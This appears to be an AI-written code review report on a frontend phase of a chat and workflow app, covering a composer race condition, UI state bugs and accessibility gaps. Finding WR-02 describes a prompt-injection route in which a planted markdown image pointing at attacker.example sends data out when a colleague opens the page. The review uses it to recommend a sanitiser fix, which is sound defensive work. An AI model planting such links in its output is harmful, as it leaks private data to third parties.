---
phase: 296-close-v4-7-debt
part: frontend
reviewed: 2026-10-27T01:23:36Z
depth: standard
diff_base: 27f1cdf9b33b1f6f76e1963fd746e84bbff2840e
files_reviewed: 54
files_reviewed_list:
  - frontend/src/components/chat/CitationCheckAction.tsx
  - frontend/src/components/chat/ThreadWorkflowPicker.tsx
  - frontend/src/components/chat/artifacts/ArtifactTooltip.tsx
  - frontend/src/components/chat/artifacts/DiagramArtifact.tsx
  - frontend/src/components/chat/artifacts/diagramLayout.ts
  - frontend/src/components/chat/citationVerdicts.ts
  - frontend/src/components/chat/composerCopy.ts
  - frontend/src/components/chat/useStartWorkflowInThread.ts
  - frontend/src/components/layout/ChatLaunchForm.tsx
  - frontend/src/components/panel/PendingAskCard.tsx
  - frontend/src/components/panel/PhaseCard.tsx
  - frontend/src/components/panel/PhaseTimeline.tsx
  - frontend/src/components/panel/phaseStatusMeta.ts
  - frontend/src/components/settings/RerankEngineBlock.tsx
  - frontend/src/components/settings/apiKeys/apiKeyFacts.ts
  - frontend/src/components/settings/apiKeys/apiKeysCopy.ts
  - frontend/src/components/settings/apiKeys/curlExamples.ts
  - frontend/src/components/settings/rerankEngines.ts
  - frontend/src/components/workflows/DescribeReferencesSection.tsx
  - frontend/src/components/workflows/DescribeTemplateRow.tsx
  - frontend/src/components/workflows/DraftInputsFold.tsx
  - frontend/src/components/workflows/GovernanceSection.tsx
  - frontend/src/components/workflows/PhaseFormPanel.tsx
  - frontend/src/components/workflows/PublishGauntlet.tsx
  - frontend/src/components/workflows/RunEvidenceReport.tsx
  - frontend/src/components/workflows/TeamPicture.tsx
  - frontend/src/components/workflows/TemplateAttachSection.tsx
  - frontend/src/components/workflows/WorkflowCanvas.tsx
  - frontend/src/components/workflows/WorkflowScheduleModal.tsx
  - frontend/src/components/workflows/canvasModel.ts
  - frontend/src/components/workflows/declaredInputsVocabulary.ts
  - frontend/src/components/workflows/definitionOps.ts
  - frontend/src/components/workflows/describeRefusalVocabulary.ts
  - frontend/src/components/workflows/evidenceVocabulary.ts
  - frontend/src/components/workflows/library/RunModal.tsx
  - frontend/src/components/workflows/library/WorkflowCard.tsx
  - frontend/src/components/workflows/library/libraryVocabulary.ts
  - frontend/src/components/workflows/phaseVocabulary.ts
  - frontend/src/components/workflows/soulData.ts
  - frontend/src/components/workflows/teamModel.ts
  - frontend/src/components/workflows/teamVocabulary.ts
  - frontend/src/components/workflows/templateDraftBind.ts
  - frontend/src/components/workflows/templateFirstVocabulary.ts
  - frontend/src/components/workflows/useTemplateFirstDraft.ts
  - frontend/src/lib/api/apiKeys.ts
  - frontend/src/lib/api/knowledge.ts
  - frontend/src/lib/api/workflows.ts
  - frontend/src/pages/WorkflowBuilderPage.tsx
  - frontend/src/pages/WorkflowRunPage.tsx
  - frontend/src/pages/WorkflowsPage.tsx
  - frontend/src/providers/StreamsProvider.tsx
  - frontend/src/stores/citationCheckStore.ts
  - frontend/src/stores/streamsStore.ts
  - frontend/src/types/schedule.ts
findings:
  critical: 1
  warning: 3
  info: 6
  total: 10
status: issues_found
---

# Phase 296: Code Review Report (frontend half)

**Reviewed:** 2026-10-27T01:23:36Z
**Depth:** standard (diff `27f1cdf9b..HEAD`, read against the code it calls)
**Files Reviewed:** 54
**Status:** issues_found

## Summary

I reviewed every frontend file on the scope list against its 296 diff, and followed the calls
across modules where a change relies on them: `sendMessage`'s refusal arms and `MessageInput`'s
prefill effect, `useDraftPersistence.saveNow` / `performWrite`, `MarkdownRenderer`,
`PhaseCard`'s `isRunning` consumers, the backend wire models for `outcome`, `needs_task`,
`unplaced_sentences`, `covered_by` and `auto_answered`, and the backend rerank alias table.

Most of the phase holds up when traced:
- The D-09 controlled `view` / `onViewChange` pair falls back to local state when absent, and the team branch in the canvas returns early.
- `engineFor` returning `null` is handled at every caller.
- The wire types match the backend models.
- `splitTemplateBind` is applied at both `uploadWorkflowTemplate` callers.
- The generated-draft `saveNow` reaches the create branch, and its `onDraftCreated` → `bindHeldTemplate` path works as intended.
- The `newestAskPerRun` dedupe keys on `workflow_run_id`, which stays the same across resumes, so it collapses the re-asked prompts.

**CR-01 is the important finding.** The in-thread workflow-start fix (287-WR-02) is supposed to keep the kickoff text out of the composer. In the real mount it does not: a 422 or 400 refusal still puts `Run <workflow>` into the composer. React flushes the provider's failed-draft write, and `MessageInput`'s prefill effect copies it, before the hook gets a chance to clean the draft up. The hook's test checks only the store, so it cannot see this.

## Critical Issues

### CR-01: A refused in-thread start still puts "Run <workflow>" into the composer (287-WR-02 not closed in the live mount)

**File:** `frontend/src/components/chat/useStartWorkflowInThread.ts:96-114` (cooperating with `frontend/src/providers/StreamsProvider.tsx:3306-3312` and `frontend/src/components/chat/MessageInput.tsx:384-389`)

**Issue:** The hook assumes it can take over the provider's refusal before anything renders. It cannot. Here is the trace for a kickoff the server refuses with 422 (or 400, or any 409 that does not carry the lock prefix):

1. `sendMessage`'s generic `ApiError` arm runs `useStreamsStore.setState({ reconcileErrors: …, failedSendDrafts: …set(threadId, "Run X") })` (StreamsProvider.tsx:3309-3312).
2. That write notifies `useFailedSendDraftForThread` in `ChatArea` (ChatArea.tsx:170). Zustand 5 subscribes through `useSyncExternalStore`, so React 19 schedules a SyncLane render on a microtask, queued now.
3. `sendMessage` runs its `finally` block, which does more synchronous setState calls and no await, and then returns. Only now does its promise resolve and queue the hook's `.then` reaction.
4. Microtasks run in order, so React renders first. `ChatArea` passes `prefillMessage={failedDraft ?? …}` (ChatArea.tsx:879). For a SyncLane commit, React flushes passive effects synchronously, so `MessageInput`'s effect runs `setValue("Run X")` and then `onClearPrefill()`.
5. Only then does the hook's `.then` / `.catch` delete `failedSendDrafts[threadId]`. Deleting the draft never clears the composer, because the effect writes only when `prefillMessage` is truthy. The composer keeps `Run X`, and the banner for the `reconcileErrors` entry flashes for one frame.

The result: the person sees the worded failure under the picker, and also finds `Run <workflow>` in the composer. Pressing Enter sends it as an ordinary Deep message, which is exactly what the comments at `composerCopy.ts:110-114` and `useStartWorkflowInThread.ts:88-90` say cannot happen. The new suite (`useStartWorkflowInThread.test.tsx:152-165`) checks the store map after the promise settles and never mounts `ChatArea` or `MessageInput`, so it passes while the defect ships.

**Fix:** Stop the provider from stashing a draft for a kickoff, rather than undoing the stash afterwards. One guard in the existing arm does it (a G-5 one-touch):
```ts
// StreamsProvider.tsx generic ApiError arm
useStreamsStore.setState((s) => ({
  reconcileErrors: new Map(s.reconcileErrors).set(threadId, err),
  // A kickoff's text is not the person's: never offer it back to the composer.
  ...(opts?.workflowDefinitionId
    ? {}
    : { failedSendDrafts: new Map(s.failedSendDrafts).set(threadId, content) }),
}))
```
After that change the hook must detect its refusal by the `reconcileErrors` identity change alone, or better, receive the error directly through an `onRefused` option on `sendMessage`. Then add a test that mounts `ChatArea` with the real store and asserts the composer `textarea` is empty after a 422 kickoff.

## Warnings

### WR-01: A paused run's step reads "! Waiting" next to a pulsing "Working" line and a "<slug> running" progress bar

**File:** `frontend/src/components/panel/PhaseCard.tsx:455-459, 682-692, 742-750` (with `phaseStatusMeta.ts:305` and `PhaseTimeline.tsx:253`)

**Issue:** `runPaused` changes only the status text, through `statusMetaForRun`. `isRunning` is still `phase.status === "running" && runLive !== false`, and a paused run is not terminal, so `runLive` is true. So for 295-D-uat-02, the case this change targets, the card renders all of these at once:
- `! Waiting` in amber;
- an indeterminate progress bar whose accessible name is `"<slug> running"`;
- the activity line `● Working` with a pulsing dot;
- `aria-busy="true"` on the region.

The card is saying *Waiting* and *Working* about the same step at the same moment, and assistive tech hears "running". UI-SPEC row 4 says the step reads `! Waiting`, and this contradicts it.

**Fix:** Fold `runPaused` into the liveness reading the card already derives, so the instruments follow the status:
```ts
const isRunning = phase.status === "running" && runLive !== false && runPaused !== true
```
Check the forced-open accordion behaviour, which also keys on `isRunning`. If the paused step should stay open, keep a separate `forcedOpen = phase.status === "running" && runLive !== false`.

### WR-02: The evidence report now renders step output as HTML, so colleagues' browsers load remote images an LLM wrote

**File:** `frontend/src/components/workflows/RunEvidenceReport.tsx:339-341` (renderer: `frontend/src/components/chat/MarkdownRenderer.tsx:22-30`)

**Issue:** 289-F-B swapped the plain-text `whitespace-pre-wrap` output for `MarkdownRenderer`, which is `marked` plus `DOMPurify.sanitize` with default settings. DOMPurify's default allow-list keeps `<img src="https://…">` and `<a href="https://…">`. Step output is model-written and often derived from retrieved documents or connector content. That makes it a known prompt-injection target: a planted `![](https://attacker.example/p?d=<summary>)` becomes an image request sent automatically the moment the page renders.

Before 296 this page showed text only. The audience is the reason it matters here: the evidence report is the surface built for same-org **colleagues** (D-05 / 289 R-04). A non-owner opening the record now fires that request from their own browser, with no click, carrying whatever the model put into the URL. Chat already has this behaviour for the owner. 296 extends it to a wider audience on the page that carries the privacy boundary.

**Fix:** For this surface, either keep plain text, or sanitise with remote media forbidden:
```ts
DOMPurify.sanitize(html, { FORBID_TAGS: ["img", "picture", "source", "video", "audio", "iframe"], FORBID_ATTR: ["srcset"] })
```
To do that, give `MarkdownRenderer` an optional `noRemoteMedia` prop. Consider also adding `rel="noopener noreferrer"` to links through a DOMPurify `afterSanitizeAttributes` hook.

### WR-03: A 409 "can't check here" now prints the same sentence twice on the message that asked

**File:** `frontend/src/stores/citationCheckStore.ts:136-144` (rendered by `frontend/src/components/chat/CitationCheckAction.tsx:70-76, 117-121`)

**Issue:** On a 409 with reason `off`, `key_missing` or `engine_reorders_only`, `run()` now sets two things:
- the shared `availability = { available: false, reason }`;
- `errors[id] = code`.

`CitationCheckAction` then renders `availabilityReason(availability)` in place of the button (ⓘ, muted), and also `checkErrorLine(errorCode)` underneath (red, `role="status"`). `checkErrorLine` maps those three codes to the same strings `availabilityReason` returns (`OFF_LINE`, `REORDERS_ONLY_LINE`, `keyMissingLine`). The asking message therefore shows one sentence twice in two tones, and screen readers announce it again. Every other message shows it once.

**Fix:** When the code is one of `UNAVAILABLE_REASONS`, update availability only and do not record a per-message error:
```ts
set((s) => reason
  ? { availability: { available: false, engine: s.availability?.engine ?? null, reason } }
  : { errors: { ...s.errors, [id]: code } })
```

## Info

### IN-01: A non-lock 409 is always worded "A workflow is already running in this thread"

**File:** `frontend/src/components/chat/useStartWorkflowInThread.ts:19-25`

**Issue:** `failureFor` maps every 409 to `startLocked`. The send path has other 409s: the paused-workflow refusal (`workflow_kickoff.py:176-183`, "…paused, waiting for your answer. Answer it in the panel…") and the Expert/thread org mismatch (`threads.py:837`). The first loses the one fact that tells the person where to go next. The second is false. Both are rare, because the picker is disabled while the lock is set.

**Fix:** Key `"locked"` on the lock arm only, for example the provider's lock sentence or a `kind` the provider records. Let other 409s fall to `startFailed`, or to a paused-specific line.

### IN-02: The availability read is retried immediately, with no backoff, whatever the error

**File:** `frontend/src/stores/citationCheckStore.ts:96-97`

**Issue:** `.catch(() => getCitationChecks(chunk))` re-sends the GET in the same tick for any error, including 401, 429 and 404, where an instant retry cannot succeed and only doubles the load.

**Fix:** Retry only on network errors and 5xx, after a short delay (for example 500 ms).

### IN-03: Two doc comments were orphaned by insertions above them

**File:** `frontend/src/stores/citationCheckStore.ts:66-67`, `frontend/src/components/chat/artifacts/diagramLayout.ts:104-105`

**Issue:** `/** A fixed code for a failed POST… */` now sits directly above `UNAVAILABLE_REASONS`, which has its own comment, and `errorCodeOf` has none. `/** Step 1: which edges are back edges… */` now documents `LABEL_HEIGHT` instead of `findBackEdges`. IDE hovers show the wrong text.

**Fix:** Move each comment back above the function it describes.

### IN-04: The disabled Word-blank ticks do not say why they are disabled

**File:** `frontend/src/components/workflows/DescribeTemplateRow.tsx:476-481`

**Issue:** The picker and the Clear button carry `aria-describedby={disabledNoteId}` while composing, but the blank checkboxes get only `disabled`. A screen-reader user hears them as unavailable with no reason, unlike the sibling controls (UI-SPEC 291-WR-01: "say why").

**Fix:** Spread `{...lockedBy}` onto the checkbox as well.

### IN-05: The "Look it up isn't available" note renders even when no row has a switch

**File:** `frontend/src/components/workflows/DraftInputsFold.tsx:205-208`

**Issue:** The note is rendered unconditionally. When every row is `step` or `blank`, it describes a control that is not on screen.

**Fix:** Render it only when `rows.some((r) => r.source !== "step" && r.source !== "blank")`.

### IN-06: The Team view's scroll region and its figure have the same accessible name

**File:** `frontend/src/components/workflows/TeamPicture.tsx:467, 485-487`

**Issue:** The new `role="region"` gets `aria-label={teamFigureLabel(workflowName)}`, and the `<figure>` inside it carries the same label. Screen readers announce "Team picture for X" twice in a row.

**Fix:** Give the region a distinct name, for example `"Team picture, scrollable"`, or point it at the figure with `aria-labelledby` and drop the figure's own label.

---

_Reviewed: 2026-10-27T01:23:36Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
